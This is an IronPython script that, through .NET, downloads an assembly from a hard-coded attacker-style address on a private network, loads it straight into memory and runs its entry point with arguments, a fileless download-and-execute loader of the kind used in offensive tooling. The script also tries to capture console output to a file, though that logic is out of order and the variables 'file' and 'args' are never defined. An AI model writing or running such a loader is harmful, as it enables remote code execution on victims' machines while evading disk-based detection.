import clr,System
clr.AddReference('System')
clr.AddReference('System.IO')
clr.AddReference('System.Net')
clr.AddReference('System.Reflection')
clr.AddReference('mscorlib')

from System.Net import WebClient
from System.Reflection import Assembly
from System import Console
from System.IO import StringWriter

sw = StringWriter()
oldConsOut = Console.Out
Console.SetOut(sw)
Console.WriteLine

def download_and_execute_assembly(url,args):
    webClient = WebClient()
    assemblyBytes = webClient.DownloadData(url)
    assembly = Assembly.Load(assemblyBytes)
    entryPoint = assembly.EntryPoint
    if entryPoint is not None:
        #entryPoint.Invoke(None, [Array[String]([])])
        args_array = System.Array[System.String](args)
        entryPoint.Invoke(None, [args_array])
    pass

Console.SetOut(oldConsOut)
captured_output = sw.ToString()

assembly_url = f"http://192.168.133.132:8000/{file}"
# args = sys.argv[1:]
download_and_execute_assembly(assembly_url,args)

with open('test.txt', 'w') as f:
    f.write(captured_output)